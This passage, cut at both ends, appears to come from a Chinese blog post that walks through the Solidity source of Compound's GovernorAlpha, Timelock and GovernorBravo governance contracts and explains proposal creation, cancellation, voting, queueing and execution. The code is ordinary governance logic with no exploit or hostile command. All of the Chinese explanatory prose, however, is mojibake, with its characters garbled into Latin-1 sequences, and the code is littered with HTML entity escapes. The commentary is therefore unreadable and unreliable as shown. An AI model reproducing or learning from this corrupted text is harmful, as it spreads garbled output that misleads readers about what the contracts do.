&#125;\n\n    function __acceptAdmin() public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__acceptAdmin: sender must be gov guardian\");\n        timelock.acceptAdmin();\n    &#125;\n\n    function __abdicate() public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__abdicate: sender must be gov guardian\");\n        guardian = address(0);\n    &#125;\n\n    function __queueSetTimelockPendingAdmin(address newPendingAdmin, uint eta) public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__queueSetTimelockPendingAdmin: sender must be gov guardian\");\n        timelock.queueTransaction(address(timelock), 0, \"setPendingAdmin(address)\", abi.encode(newPendingAdmin), eta);\n    &#125;\n\n    function __executeSetTimelockPendingAdmin(address newPendingAdmin, uint eta) public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__executeSetTimelockPendingAdmin: sender must be gov guardian\");\n        timelock.executeTransaction(address(timelock), 0, \"setPendingAdmin(address)\", abi.encode(newPendingAdmin), eta);\n    &#125;\n\n    function add256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        uint c = a + b;\n        require(c >= a, \"addition overflow\");\n        return c;\n    &#125;\n\n    function sub256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        require(b &lt;= a, \"subtraction underflow\");\n        return a - b;\n    &#125;\n\n    function getChainId() internal view returns (uint) &#123;\n        uint chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\ninterface TimelockInterface &#123;\n    function delay() external view returns (uint);\n    function GRACE_PERIOD() external view returns (uint);\n    function acceptAdmin() external;\n    function queuedTransactions(bytes32 hash) external view returns (bool);\n    function queueTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external returns (bytes32);\n    function cancelTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external;\n    function executeTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external payable returns (bytes memory);\n&#125;\n\ninterface CompInterface &#123;\n    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);\n&#125;\n\n\n\nAnalyzefunction propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n    require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), \"GovernorAlpha::propose: proposer votes below proposal threshold\");\n    require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorAlpha::propose: proposal function information arity mismatch\");\n    require(targets.length != 0, \"GovernorAlpha::propose: must provide actions\");\n    require(targets.length &lt;= proposalMaxOperations(), \"GovernorAlpha::propose: too many actions\");\n\n    uint latestProposalId = latestProposalIds[msg.sender];\n    if (latestProposalId != 0) &#123;\n      ProposalState proposersLatestProposalState = state(latestProposalId);\n      require(proposersLatestProposalState != ProposalState.Active, \"GovernorAlpha::propose: one live proposal per proposer, found an already active proposal\");\n      require(proposersLatestProposalState != ProposalState.Pending, \"GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal\");\n    &#125;\n\n    uint startBlock = add256(block.number, votingDelay());\n    uint endBlock = add256(startBlock, votingPeriod());\n\n    proposalCount++;\n    uint proposalId = proposalCount;\n    Proposal storage newProposal = proposals[proposalId];\n    // This should never happen but add a check in case.\n    require(newProposal.id == 0, \"GovernorAlpha::propose: ProposalID collsion\");\n    newProposal.id = proposalId;\n    newProposal.proposer = msg.sender;\n    newProposal.eta = 0;\n    newProposal.targets = targets;\n    newProposal.values = values;\n    newProposal.signatures = signatures;\n    newProposal.calldatas = calldatas;\n    newProposal.startBlock = startBlock;\n    newProposal.endBlock = endBlock;\n    newProposal.forVotes = 0;\n    newProposal.againstVotes = 0;\n    newProposal.canceled = false;\n    newProposal.executed = false;\n\n    latestProposalIds[newProposal.proposer] = newProposal.id;\n\n    emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n    return newProposal.id;\n&#125;\n\nåˆ›å»ºææ¡ˆæœ‰æ‰€é™åˆ¶ï¼Œéœ€è¦ææ¡ˆäººå†ä¸Šä¸€ä¸ªå—çš„ç¥¨æ•°å¤§äºŽææ¡ˆé—¨æ§›ã€‚ç´§æŽ¥ç€åˆ¤æ–­targetï¼Œvalueï¼Œsignatureä»¥åŠcalldataé•¿åº¦å¯¹åº”ç›¸ç­‰ï¼Œæ£€æµ‹å¯¹åº”çš„actionä¸ä¸º0ä¹Ÿä¸å¤§ä¸Žæœ€å¤§å€¼10\nå¦‚æžœåˆ›å»ºè¯¥ææ¡ˆè€…ä¸æ­¢æœ‰è¿™ä¸€ä¸ªææ¡ˆï¼Œåˆ™åˆ¤æ–­ä¸Šä¸€ä¸ªææ¡ˆæ˜¯å¦å¤„äºŽactiveæˆ–pendingçŠ¶æ€ä¸‹ï¼Œå¿…é¡»æ»¡è¶³åªæœ‰ä¸€ä¸ªææ¡ˆå¤„äºŽactiveæˆ–pendingçš„çŠ¶æ€\nåˆ›å»ºæ—¶éœ€è¦æä¾›æ‰§è¡Œæ—¶éœ€è¦çš„targetï¼Œvalueï¼Œå‡½æ•°çš„signutureä»¥åŠcalldataï¼ˆæˆ–çº¯calldataï¼‰\nè®¡ç®—å¼€å§‹å’Œç»“æŸçš„blockï¼Œæœ€åŽæ›´æ–°ææ¡ˆåˆ°Proposalæ˜ å°„ä¸­åŽ»ï¼ŒåŒæ—¶æ›´æ–°æœ€æ–°çš„ææ¡ˆidä¸ºå½“å‰çš„ææ¡ˆid\nfunction cancel(uint proposalId) public &#123;\n    ProposalState state = state(proposalId);\n    require(state != ProposalState.Executed, \"GovernorAlpha::cancel: cannot cancel executed proposal\");\n\n    Proposal storage proposal = proposals[proposalId];\n    require(msg.sender == guardian || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold(), \"GovernorAlpha::cancel: proposer above threshold\");\n\n    proposal.canceled = true;\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    &#125;\n\n    emit ProposalCanceled(proposalId);\n&#125;\n\nç»“æŸä¸€ä¸ªææ¡ˆï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦å·²æ‰§è¡Œï¼Œä¸èƒ½ç»“æŸä¸€ä¸ªå·²æ‰§è¡Œçš„ææ¡ˆï¼Œåªæœ‰æ»¡è¶³guardianæ‰§è¡Œæ“ä½œæˆ–è€…æ»¡è¶³proposerå†ä¸Šä¸€ä¸ªå—çš„ç¥¨æ•°ä½ŽäºŽææ¡ˆé—¨æ§›çš„æƒ…å†µä¸‹æ‰å¯ä»¥ç»“æŸä¸€ä¸ªææ¡ˆ\nå°†å¯¹åº”ææ¡ˆçš„canceledå˜é‡è®¾ç½®ä¸ºtrueï¼ŒåŒæ—¶å–æ¶ˆå¯¹éœ€è¦æ‰§è¡Œçš„æ“ä½œæ ‡è®°ï¼Œå°†timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))é‡æ–°æ›´æ”¹ä¸ºfalse\nfunction castVote(uint proposalId, bool support) public &#123;\n    return _castVote(msg.sender, proposalId, support);\n&#125;\n\nfunction castVoteBySig(uint proposalId, bool support, uint8 v, bytes32 r, bytes32 s) public &#123;\n    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n    bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    address signatory = ecrecover(digest, v, r, s);\n    require(signatory != address(0), \"GovernorAlpha::castVoteBySig: invalid signature\");\n    return _castVote(signatory, proposalId, support);\n&#125;\n\nfunction _castVote(address voter, uint proposalId, bool support) internal &#123;\n    require(state(proposalId) == ProposalState.Active, \"GovernorAlpha::_castVote: voting is closed\");\n    Proposal storage proposal = proposals[proposalId];\n    Receipt storage receipt = proposal.receipts[voter];\n    require(receipt.hasVoted == false, \"GovernorAlpha::_castVote: voter already voted\");\n    uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n    if (support) &#123;\n        proposal.forVotes = add256(proposal.forVotes, votes);\n    &#125; else &#123;\n        proposal.againstVotes = add256(proposal.againstVotes, votes);\n    &#125;\n\n    receipt.hasVoted = true;\n    receipt.support = support;\n    receipt.votes = votes;\n\n    emit VoteCast(voter, proposalId, support, votes);\n&#125;\n\nä¸‰ä¸ªæŠ•ç¥¨å‡½æ•°ï¼Œæ ¸å¿ƒå‡½æ•°ä¸º_castVoteï¼Œä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºæŠ•ç¥¨è€…ï¼ŒæŠ•ç¥¨çš„ææ¡ˆç¼–å·ä»¥åŠæ”¯æŒä¸Žå¦\né¦–å…ˆåˆ¤æ–­æ‰€æŠ•ææ¡ˆæ˜¯å¦æ˜¯activeï¼Œå¿…é¡»åœ¨activeæƒ…å†µä¸‹å¯ä»¥è¿›è¡ŒæŠ•ç¥¨ï¼Œå†åˆ¤æ–­å½“å‰æŠ•ç¥¨è€…æ˜¯å¦å·²ç»å¯¹æ­¤ææ¡ˆè¿›è¡Œè¿‡æŠ•ç¥¨ï¼Œè¦æ±‚æ²¡æœ‰è¿›è¡Œè¿‡æŠ•ç¥¨\næŠ•ç¥¨æ˜¯ä»»ä½•äººå‡å¯æŠ•ç¥¨ï¼Œå‰ææ˜¯æœ‰ç¥¨ï¼ˆè¿™é‡Œå¯¹åº”åˆ°compound tokenåˆçº¦ï¼‰ç¥¨æ•°æ˜¯å–å†³äºŽä¸Šä¸€ä¸ªåŒºå—æ—¶å¯¹åº”çš„voteè€Œä¸æ˜¯å½“å‰åŒºå—ï¼Œå¯¹åº”æ”¯æŒä¸Žå¦å°†æ‰€å¯¹åº”çš„ç¥¨æ•°è¿›è¡ŒåŠ å‡ï¼ŒåŒæ—¶è®°å½•æŠ•ç¥¨è€…çš„æŠ•ç¥¨æ•°æ®\ncastVoteBySigä½¿ç”¨äº†ç­¾åçš„æ–¹æ³•ï¼Œå…¶ä½™ç›¸åŒ\nfunction queue(uint proposalId) public &#123;\n    require(state(proposalId) == ProposalState.Succeeded, \"GovernorAlpha::queue: proposal can only be queued if it is succeeded\");\n    Proposal storage proposal = proposals[proposalId];\n    uint eta = add256(block.timestamp, timelock.delay());\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n    &#125;\n    proposal.eta = eta;\n    emit ProposalQueued(proposalId, eta);\n&#125;\n\næ­¤å‡½æ•°å°†ææ¡ˆåŠ å…¥æŽ’é˜Ÿï¼Œå…ˆåˆ¤æ–­ææ¡ˆæ˜¯å¦æˆåŠŸï¼ŒæˆåŠŸçš„æŠ•ç¥¨æ‰å¯ä»¥åŠ å…¥é˜Ÿåˆ—ï¼Œæ”¯æŒç¥¨å¤§äºŽåå¯¹ç¥¨å¹¶ä¸”æ”¯æŒç¥¨å¤§äºŽ4%compå‘è¡Œé‡\nå†é€šè¿‡è°ƒç”¨_queueOrRevertå‡½æ•°åˆ¤æ–­å·²ç»è¿›å…¥é˜Ÿåˆ—çš„ææ¡ˆæ˜¯å¦å«æœ‰ç›¸åŒæ“ä½œçš„äº¤æ˜“ï¼Œå¦‚æžœä¸å­˜åœ¨åˆ™å°†å¯¹åº”äº¤æ˜“è¿›è¡Œæ ‡è®°è®°å½•ï¼Œé¿å…é˜Ÿåˆ—ä¸­å«æœ‰ç›¸åŒçš„äº¤æ˜“\nåŒæ—¶æ›´æ–°etaï¼Œå³ææ¡ˆå¼€å§‹æ‰§è¡Œçš„æ—¶é—´\nfunction execute(uint proposalId) public payable &#123;\n    require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n    Proposal storage proposal = proposals[proposalId];\n    proposal.executed = true;\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        timelock.executeTransaction&#123;value: proposal.values[i]&#125;(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    &#125;\n    emit ProposalExecuted(proposalId);\n&#125;\n\nè¯¥å‡½æ•°ç”¨äºŽæ‰§è¡Œï¼ˆæŠ•ç¥¨åŽä¸ç«‹åˆ»æ‰§è¡Œï¼Œè€Œæ˜¯éœ€è¦æœ‰äººè¿›è¡Œæ“ä½œï¼‰ï¼Œææ¡ˆæœ‰ä¸€å®šå…¬ç¤ºæœŸï¼Œåœ¨æ­¤æœŸé—´å¯ä»¥å–æ¶ˆï¼ˆTimelock. Delay()ï¼‰ï¼Œå…ˆåˆ¤æ–­ææ¡ˆæ˜¯å¦å·²ç»å¤„äºŽé˜Ÿåˆ—ä¸­ï¼Œæ»¡è¶³è¦æ±‚åˆ™æ›´æ–°å¯¹åº”å˜é‡ï¼Œè°ƒç”¨timelockåˆçº¦ä¸‹çš„executeTransactionå‡½æ•°ä¾æ¬¡æ‰§è¡Œæ“ä½œ\nå‰©ä¸‹ä¸€äº›getå‡½æ•°ï¼Œè¿ç®—å‡½æ•°ä»¥åŠå˜é‡ä¿®æ”¹å‡½æ•°æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸å†åšè¿‡å¤šè§£é‡Šäº†\nTimelockCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\nimport \"./SafeMath.sol\";\n\ncontract Timelock &#123;\n    using SafeMath for uint;\n\n    event NewAdmin(address indexed newAdmin);\n    event NewPendingAdmin(address indexed newPendingAdmin);\n    event NewDelay(uint indexed newDelay);\n    event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint eta);\n    event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint eta);\n    event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint eta);\n\n    uint public constant GRACE_PERIOD = 14 days;\n    uint public constant MINIMUM_DELAY = 2 days;\n    uint public constant MAXIMUM_DELAY = 30 days;\n\n    address public admin;\n    address public pendingAdmin;\n    uint public delay;\n\n    mapping (bytes32 => bool) public queuedTransactions;\n\n\n    constructor(address admin_, uint delay_) public &#123;\n        require(delay_ >= MINIMUM_DELAY, \"Timelock::constructor: Delay must exceed minimum delay.\");\n        require(delay_ &lt;= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n\n        admin = admin_;\n        delay = delay_;\n    &#125;\n\n    fallback() external payable &#123; &#125;\n\n    function setDelay(uint delay_) public &#123;\n        require(msg.sender == address(this), \"Timelock::setDelay: Call must come from Timelock.\");\n        require(delay_ >= MINIMUM_DELAY, \"Timelock::setDelay: Delay must exceed minimum delay.\");\n        require(delay_ &lt;= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n        delay = delay_;\n\n        emit NewDelay(delay);\n    &#125;\n\n    function acceptAdmin() public &#123;\n        require(msg.sender == pendingAdmin, \"Timelock::acceptAdmin: Call must come from pendingAdmin.\");\n        admin = msg.sender;\n        pendingAdmin = address(0);\n\n        emit NewAdmin(admin);\n    &#125;\n\n    function setPendingAdmin(address pendingAdmin_) public &#123;\n        require(msg.sender == address(this), \"Timelock::setPendingAdmin: Call must come from Timelock.\");\n        pendingAdmin = pendingAdmin_;\n\n        emit NewPendingAdmin(pendingAdmin);\n    &#125;\n\n    function queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public returns (bytes32) &#123;\n        require(msg.sender == admin, \"Timelock::queueTransaction: Call must come from admin.\");\n        require(eta >= getBlockTimestamp().add(delay), \"Timelock::queueTransaction: Estimated execution block must satisfy delay.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        queuedTransactions[txHash] = true;\n\n        emit QueueTransaction(txHash, target, value, signature, data, eta);\n        return txHash;\n    &#125;\n\n    function cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public &#123;\n        require(msg.sender == admin, \"Timelock::cancelTransaction: Call must come from admin.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        queuedTransactions[txHash] = false;\n\n        emit CancelTransaction(txHash, target, value, signature, data, eta);\n    &#125;\n\n    function executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public payable returns (bytes memory) &#123;\n        require(msg.sender == admin, \"Timelock::executeTransaction: Call must come from admin.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        require(queuedTransactions[txHash], \"Timelock::executeTransaction: Transaction hasn't been queued.\");\n        require(getBlockTimestamp() >= eta, \"Timelock::executeTransaction: Transaction hasn't surpassed time lock.\");\n        require(getBlockTimestamp() &lt;= eta.add(GRACE_PERIOD), \"Timelock::executeTransaction: Transaction is stale.\");\n\n        queuedTransactions[txHash] = false;\n\n        bytes memory callData;\n\n        if (bytes(signature).length == 0) &#123;\n            callData = data;\n        &#125; else &#123;\n            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n        &#125;\n\n        // solium-disable-next-line security/no-call-value\n        (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);\n        require(success, \"Timelock::executeTransaction: Transaction execution reverted.\");\n\n        emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n\n        return returnData;\n    &#125;\n\n    function getBlockTimestamp() internal view returns (uint) &#123;\n        // solium-disable-next-line security/no-block-members\n        return block.timestamp;\n    &#125;\n&#125;\n\n\n\nAnalyzeé…åˆGovernance Alphaåˆçº¦ï¼Œè¿›è¡ŒæŽ’é˜Ÿæ“ä½œï¼Œå–æ¶ˆæ“ä½œï¼Œæ‰§è¡Œæ“ä½œç­‰åŠŸèƒ½\nå…¶ä¸­delayä¸ºæ‰§è¡Œæ—¶é—´çš„é™åˆ¶\nä»£ç å¦‚ä¸‹ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸å†è¿‡å¤šè§£é‡Š\nfunction queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public returns (bytes32) &#123;\n    require(msg.sender == admin, \"Timelock::queueTransaction: Call must come from admin.\");\n    require(eta >= getBlockTimestamp().add(delay), \"Timelock::queueTransaction: Estimated execution block must satisfy delay.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    queuedTransactions[txHash] = true;\n\n    emit QueueTransaction(txHash, target, value, signature, data, eta);\n    return txHash;\n&#125;\n\nfunction cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public &#123;\n    require(msg.sender == admin, \"Timelock::cancelTransaction: Call must come from admin.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    queuedTransactions[txHash] = false;\n\n    emit CancelTransaction(txHash, target, value, signature, data, eta);\n&#125;\n\nfunction executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public payable returns (bytes memory) &#123;\n    require(msg.sender == admin, \"Timelock::executeTransaction: Call must come from admin.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    require(queuedTransactions[txHash], \"Timelock::executeTransaction: Transaction hasn't been queued.\");\n    require(getBlockTimestamp() >= eta, \"Timelock::executeTransaction: Transaction hasn't surpassed time lock.\");\n    require(getBlockTimestamp() &lt;= eta.add(GRACE_PERIOD), \"Timelock::executeTransaction: Transaction is stale.\");\n\n    queuedTransactions[txHash] = false;\n\n    bytes memory callData;\n\n    if (bytes(signature).length == 0) &#123;\n        callData = data;\n    &#125; else &#123;\n        callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n    &#125;\n\n    // solium-disable-next-line security/no-call-value\n    (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);\n    require(success, \"Timelock::executeTransaction: Transaction execution reverted.\");\n\n    emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n\n    return returnData;\n&#125;\n\nGovernorBravoCode\nClick to see more\npragma solidity ^0.5.16;\npragma experimental ABIEncoderV2;\n\nimport \"./GovernorBravoInterfaces.sol\";\n\ncontract GovernorBravoDelegate is GovernorBravoDelegateStorageV1, GovernorBravoEvents &#123;\n\n    /// @notice The name of this contract\n    string public constant name = \"Compound Governor Bravo\";\n\n    /// @notice The minimum setable proposal threshold\n    uint public constant MIN_PROPOSAL_THRESHOLD = 50000e18; // 50,000 Comp\n\n    /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed\n    function quorumVotes() public pure returns (uint) &#123; return 400000e18; &#125; // 400,000 = 4% of Comp\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    function proposalMaxOperations() public pure returns (uint) &#123; return 10; &#125; // 10 actions\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the ballot struct used by the contract\n    bytes32 public constant BALLOT_TYPEHASH = keccak256(\"Ballot(uint256 proposalId,uint8 support)\");\n\n    function initialize(address timelock_, address comp_, uint votingPeriod_, uint votingDelay_, uint proposalThreshold_) public &#123;\n        require(msg.sender == admin, \"GovernorBravo::initialize: admin only\");\n        timelock = TimelockInterface(timelock_);\n        comp = CompInterface(comp_);\n        votingPeriod = votingPeriod_;\n        votingDelay = votingDelay_;\n        proposalThreshold = proposalThreshold_;\n    &#125;\n\n    function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n        // Reject proposals before initiating as Governor\n        require(initialProposalId != 0, \"GovernorBravo::propose: Governor Bravo not active\");\n        require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold, \"GovernorBravo::propose: proposer votes below proposal threshold\");\n        require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorBravo::propose: proposal function information arity mismatch\");\n        require(targets.length != 0, \"GovernorBravo::propose: must provide actions\");\n        require(targets.length &lt;= proposalMaxOperations(), \"GovernorBravo::propose: too many actions\");\n\n        uint latestProposalId = latestProposalIds[msg.sender];\n        if (latestProposalId != 0) &#123;\n          ProposalState proposersLatestProposalState = state(latestProposalId);\n          require(proposersLatestProposalState != ProposalState.Active, \"GovernorBravo::propose: one live proposal per proposer, found an already active proposal\");\n          require(proposersLatestProposalState != ProposalState.Pending, \"GovernorBravo::propose: one live proposal per proposer, found an already pending proposal\");\n        &#125;\n\n        uint startBlock = add256(block.number, votingDelay);\n        uint endBlock = add256(startBlock, votingPeriod);\n\n        proposalCount++;\n        Proposal memory newProposal = Proposal(&#123;\n            id: proposalCount,\n            proposer: msg.sender,\n            eta: 0,\n            targets: targets,\n            values: values,\n            signatures: signatures,\n            calldatas: calldatas,\n            startBlock: startBlock,\n            endBlock: endBlock,\n            forVotes: 0,\n            againstVotes: 0,\n            abstainVotes: 0,\n            canceled: false,\n            executed: false\n        &#125;);\n\n        proposals[newProposal.id] = newProposal;\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n        return newProposal.id;\n    &#125;\n\n    function queue(uint proposalId) external &#123;\n        require(state(proposalId) == ProposalState.Succeeded, \"GovernorBravo::queue: proposal can only be queued if it is succeeded\");\n        Proposal storage proposal = proposals[proposalId];\n        uint eta = add256(block.timestamp, timelock.delay());\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n        &#125;\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    &#125;\n\n    function _queueOrRevert(address target, uint value, string memory signature, bytes memory data, uint eta) internal &#123;\n        require(!timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))), \"GovernorBravo::_queueOrRevert: proposal action already queued at eta\");\n        timelock.queueTransaction(target, value, signature, data, eta);\n    &#125;\n\n    function execute(uint proposalId) external payable &#123;\n        require(state(proposalId) == ProposalState.Queued, \"GovernorBravo::execute: proposal can only be executed if it is queued\");\n        Proposal storage proposal = proposals[proposalId];\n        proposal.executed = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.executeTransaction.value(proposal.values[i])(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n        emit ProposalExecuted(proposalId);\n    &#125;\n\n    function cancel(uint proposalId) external &#123;\n        ProposalState state = state(proposalId);\n        require(state != ProposalState.Executed, \"GovernorBravo::cancel: cannot cancel executed proposal\");\n\n        Proposal storage proposal = proposals[proposalId];\n        require(msg.sender == proposal.proposer || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold, \"GovernorBravo::cancel: proposer above threshold\");\n\n        proposal.canceled = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n\n        emit ProposalCanceled(proposalId);\n    &#125;\n\n    function getActions(uint proposalId) external view returns (address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas) &#123;\n        Proposal storage p = proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    &#125;\n\n    function getReceipt(uint proposalId, address voter) external view returns (Receipt memory) &#123;\n        return proposals[proposalId].receipts[voter];\n    &#125;\n\n    function state(uint proposalId) public view returns (ProposalState) &#123;\n        require(proposalCount >= proposalId &amp;&amp; proposalId > initialProposalId, \"GovernorBravo::state: invalid proposal id\");\n        Proposal storage proposal = proposals[proposalId];\n        if (proposal.canceled) &#123;\n            return ProposalState.Canceled;\n        &#125; else if (block.number &lt;= proposal.startBlock) &#123;\n            return ProposalState.Pending;\n        &#125; else if (block.number &lt;= proposal.endBlock) &#123;\n            return ProposalState.Active;\n        &#125; else if (proposal.forVotes &lt;= proposal.againstVotes || proposal.forVotes &lt; quorumVotes()) &#123;\n            return ProposalState.Defeated;\n        &#125; else if (proposal.eta == 0) &#123;\n            return ProposalState.Succeeded;\n        &#125; else if (proposal.executed) &#123;\n            return ProposalState.Executed;\n        &#125; else if (block.timestamp >= add256(proposal.eta, timelock.GRACE_PERIOD())) &#123;\n            return ProposalState.Expired;\n        &#125; else &#123;\n            return ProposalState.Queued;\n        &#125;\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      */\n    function castVote(uint proposalId, uint8 support) external &#123;\n        emit VoteCast(msg.sender, proposalId, support, _castVote(msg.sender, proposalId, support), \"\");\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal with a reason\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      * @param reason The reason given for the vote by the voter\n      */\n    function castVoteWithReason(uint proposalId, uint8 support, string calldata reason) external &#123;\n        emit VoteCast(msg.sender, proposalId, support, _castVote(msg.sender, proposalId, support), reason);\n    &#125;\n\n    /**\n      * @notice Cast a vote for a proposal by signature\n      * @dev External function that accepts EIP-712 signatures for voting on proposals.\n      */\n    function castVoteBySig(uint proposalId, uint8 support, uint8 v, bytes32 r, bytes32 s) external &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"GovernorBravo::castVoteBySig: invalid signature\");\n        emit VoteCast(signatory, proposalId, support, _castVote(signatory, proposalId, support), \"\");\n    &#125;\n\n    /**\n      * @notice Internal function that caries out voting logic\n      * @param voter The voter that is casting their vote\n      * @param proposalId The id of the proposal to vote on\n      * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n      * @return The number of votes cast\n      */\n    function _castVote(address voter, uint proposalId, uint8 support) internal returns (uint96) &#123;\n        require(state(proposalId) == ProposalState.Active, \"GovernorBravo::_castVote: voting is closed\");\n        require(support &lt;= 2, \"GovernorBravo::_castVote: invalid vote type\");\n        Proposal storage proposal = proposals[proposalId];\n        Receipt storage receipt = proposal.receipts[voter];\n        require(receipt.hasVoted == false, \"GovernorBravo::_castVote: voter already voted\");\n        uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n        if (support == 0) &#123;\n            proposal.againstVotes = add256(proposal.againstVotes, votes);\n        &#125; else if (support == 1) &#123;\n            proposal.forVotes = add256(proposal.forVotes, votes);\n        &#125; else if (support == 2) &#123;\n            proposal.abstainVotes = add256(proposal.abstainVotes, votes);\n        &#125;\n\n        receipt.hasVoted = true;\n        receipt.support = support;\n        receipt.votes = votes;\n\n        return votes;\n    &#125;\n\n    /*\n     * @notice Admin function for setting the voting delay\n     * @param newVotingDelay new voting delay, in blocks\n     */\n    function _setVotingDelay(uint newVotingDelay) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setVotingDelay: admin only\");\n        uint oldVotingDelay = votingDelay;\n        votingDelay = newVotingDelay;\n\n        emit VotingDelaySet(oldVotingDelay,votingDelay);\n    &#125;\n\n    /*\n     * @notice Admin function for setting the voting period\n     * @param newVotingPeriod new voting period, in blocks\n     */\n    function _setVotingPeriod(uint newVotingPeriod) external &#123;\n        require(msg.sender == admin, \"GovernorBravo::_setVotingPeriod: admin only\");\n        uint 